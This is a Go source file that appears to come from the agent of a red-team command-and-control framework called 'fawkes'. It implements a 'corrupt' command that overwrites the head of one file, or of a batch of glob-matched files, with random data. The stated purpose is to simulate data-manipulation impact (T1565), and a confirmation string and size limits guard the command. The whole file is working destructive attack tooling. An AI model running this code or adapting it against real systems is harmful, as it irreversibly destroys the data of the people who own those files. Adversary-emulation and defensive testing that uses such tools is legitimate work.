package commands

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// corruptResult tracks targeted file corruption results.
type corruptResult struct {
	Path         string `json:"path"`
	OriginalSize int64  `json:"original_size"`
	BytesCorrupt int64  `json:"bytes_corrupted"`
	Method       string `json:"method"`
}

const (
	corruptMaxFileSize = 100 * 1024 * 1024 // 100MB max per file
)

// corruptFile performs targeted file corruption for impact simulation (T1565).
// Overwrites the first N bytes of a file with random data, rendering it unusable
// without destroying the entire file. Simulates data manipulation attacks.
func corruptFile(args encryptArgs) structs.CommandResult {
	if args.Confirm != "CORRUPT" {
		return errorResult("Error: destructive operation requires -confirm CORRUPT safety parameter")
	}

	info, err := os.Stat(args.Path)
	if err != nil {
		return errorf("Error: %v", err)
	}
	if info.IsDir() {
		return errorResult("Error: path must be a file, not directory")
	}
	if info.Size() > corruptMaxFileSize {
		return errorf("Error: file too large (%d bytes, max %d)", info.Size(), corruptMaxFileSize)
	}

	// Determine how much to corrupt: first 4KB or 10% of file, whichever is larger
	corruptSize := int64(4096)
	tenPercent := info.Size() / 10
	if tenPercent > corruptSize {
		corruptSize = tenPercent
	}
	if corruptSize > info.Size() {
		corruptSize = info.Size()
	}

	// Open file for writing at the beginning
	f, err := os.OpenFile(args.Path, os.O_WRONLY, 0)
	if err != nil {
		return errorf("Error opening file: %v", err)
	}
	defer f.Close()

	// Overwrite with random data
	randomData := make([]byte, corruptSize)
	if _, err := rand.Read(randomData); err != nil {
		return errorf("Error generating random data: %v", err)
	}
	if _, err := f.Write(randomData); err != nil {
		return errorf("Error writing corrupt data: %v", err)
	}

	result := corruptResult{
		Path:         args.Path,
		OriginalSize: info.Size(),
		BytesCorrupt: corruptSize,
		Method:       "random-overwrite-head",
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// corruptFiles performs batch targeted corruption on files matching a pattern.
func corruptFiles(args encryptArgs) structs.CommandResult {
	if args.Confirm != "CORRUPT" {
		return errorResult("Error: destructive operation requires -confirm CORRUPT safety parameter")
	}

	maxFiles := args.MaxFiles
	if maxFiles <= 0 {
		maxFiles = 100
	}

	matches, err := filepath.Glob(args.Path)
	if err != nil {
		return errorf("Error: invalid glob pattern: %v", err)
	}

	if len(matches) == 0 {
		return errorResult("Error: no files match pattern")
	}

	if len(matches) > maxFiles {
		return errorf("Error: pattern matches %d files, max %d. Use -max_files to increase limit.", len(matches), maxFiles)
	}

	var results []corruptResult
	var errors []string

	for _, path := range matches {
		info, err := os.Stat(path)
		if err != nil || info.IsDir() {
			continue
		}
		if info.Size() > corruptMaxFileSize {
			errors = append(errors, fmt.Sprintf("%s: too large (%d bytes)", path, info.Size()))
			continue
		}

		corruptSize := int64(4096)
		tenPercent := info.Size() / 10
		if tenPercent > corruptSize {
			corruptSize = tenPercent
		}
		if corruptSize > info.Size() {
			corruptSize = info.Size()
		}

		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", path, err))
			continue
		}

		randomData := make([]byte, corruptSize)
		_, _ = rand.Read(randomData)
		_, writeErr := f.Write(randomData)
		f.Close()

		if writeErr != nil {
			errors = append(errors, fmt.Sprintf("%s: write error: %v", path, writeErr))
			continue
		}

		results = append(results, corruptResult{
			Path:         path,
			OriginalSize: info.Size(),
			BytesCorrupt: corruptSize,
			Method:       "random-overwrite-head",
		})
	}

	output := struct {
		FilesCorrupted int             `json:"files_corrupted"`
		Results        []corruptResult `json:"results"`
		Errors         []string        `json:"errors,omitempty"`
	}{
		FilesCorrupted: len(results),
		Results:        results,
		Errors:         errors,
	}

	jsonBytes, _ := json.Marshal(output)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Corrupted %d files\n", len(results)))
	for _, r := range results {
		sb.WriteString(fmt.Sprintf("  %s (%d bytes corrupted)\n", r.Path, r.BytesCorrupt))
	}
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\n%d errors:\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}
	sb.WriteString("\n")
	sb.WriteString(string(jsonBytes))
	return successResult(sb.String())
}
